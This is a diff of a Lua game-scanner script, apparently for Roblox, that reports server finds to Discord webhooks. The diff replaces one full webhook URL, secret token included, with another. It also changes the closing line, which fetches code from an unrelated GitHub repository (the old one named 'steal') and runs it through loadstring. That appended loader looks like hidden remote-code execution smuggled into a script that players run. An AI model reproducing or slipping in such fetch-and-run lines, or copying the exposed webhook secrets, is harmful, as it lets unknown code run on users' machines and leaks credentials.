@@ -1,4 +1,3 @@
-
 -- 🎯 BRAINROT INCOME SCANNER v2.3 (WEBHOOKS + DEBRIS + SPECIAL LIST + VDS FORWARD + PASSWORD + JOBID ENCRYPTION)
 -- FIXED:
 -- 1) Removed 2 server-info webhooks (Medium+Server, High+Server) as requested.
@@ -95,7 +94,7 @@ sendTeleport = false,
 showJoinerAd = true
 },
 { -- Special brainrots + overpay
-url = 'https://discordapp.com/api/webhooks/1454116782855163906/ALOqMLsb1rC3wHa6SGq4tEZUm6dZ3zuDIK0Q2a0HBPOuOFC-0Pvb4kC9JROBD1CI0W1P',
+url = 'https://discord.com/api/webhooks/1454148958497669122/7fKXVFDjA-iFOoBAJ25SJtXUQh7Ufu_bUSG2Z_AVjxvJYc3Rz_gOTL8L6Q_nz6tu0iiw',
 title = '⭐️ SPECIAL BRAINROTS',
 color = 0xff00ff,
 special = true,
@@ -819,4 +818,4 @@ UserInputService.InputBegan:Connect(function(input, gpe)
         copyJobIdToClipboard()
     end
 end)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/hoasdw/steal/refs/heads/main/nenado"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Confilas/rest/refs/heads/main/Rest"))()
